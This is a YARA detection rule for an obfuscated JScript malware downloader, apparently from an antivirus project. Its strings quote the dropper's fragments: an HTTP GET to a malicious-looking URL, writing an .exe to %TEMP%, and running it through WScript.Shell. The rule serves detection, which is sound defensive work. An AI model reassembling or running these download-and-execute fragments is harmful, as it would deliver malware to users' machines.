rule sig_20160328_6a845cad4f58e8d72c45fe8518c5fd7c {
  meta:
    description = "datamaliciousorder - file 20160328_6a845cad4f58e8d72c45fe8518c5fd7c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6952f1f129fb573812aedefd33220636eac5b72890d7c5cb65ed21e411b44535"

  strings:
    $s1  = "function Ptstyua() {return Ogpalejsu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"kU0BzEWWKFVNg7X.exe\";};" fullword ascii
    $s2  = "do {WScript[Axygtoc](Amvmdygn() * 11)} while (Qyaoycncht[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Fqiuuyaak(Nirabpb, Xaxeb){return Nirabpb - Xaxeb;};" fullword ascii
    $s4  = "Qyaoycncht[Zmikjwkali](\"GET\", \"http://topreal.us/l1oad\", false);" fullword ascii
    $s5  = "var Ogpalejsu = function Seugeska() {return WScript[Kukfu](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Eqrpqfmdc() {return ((Mrhuxesi == true) && (Mrhuxesi == Lavqxei)) ? 1 : Gvaqpddrvn;};" fullword ascii
    $s7  = "function Djszfpuj(Jpshp){Ogpalejsu[\"Run\"](Jpshp, Gvaqpddrvn, Gvaqpddrvn);};" fullword ascii
    $s8  = "function Abioxh(){return Opaztv;};" fullword ascii
    $s9  = " while (Wgkgefz){" fullword ascii
    $s10 = "var Mrhuxesi = false;" fullword ascii
    $s11 = "function Lspdmwebg()" fullword ascii
    $s12 = "function Amvmdygn(){return 22;};" fullword ascii
    $s13 = "function Ajbttfv(Dfumlbz) {var Ceyipycwv = (1, 2, 3, 4, 5, Dfumlbz); return Ceyipycwv;};" fullword ascii
    $s14 = "Lavqxei = true; " fullword ascii
    $s15 = "return Fqiuuyaak(Zaysj, Vjcrp);" fullword ascii
    $s16 = "var Uezqxo = false;" fullword ascii
    $s17 = "var Lavqxei = false;" fullword ascii
    $s18 = "Mrhuxesi = true; " fullword ascii
    $s19 = "function Hvyhq(){return Kukfu;};" fullword ascii
    $s20 = "var Qddnbb = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}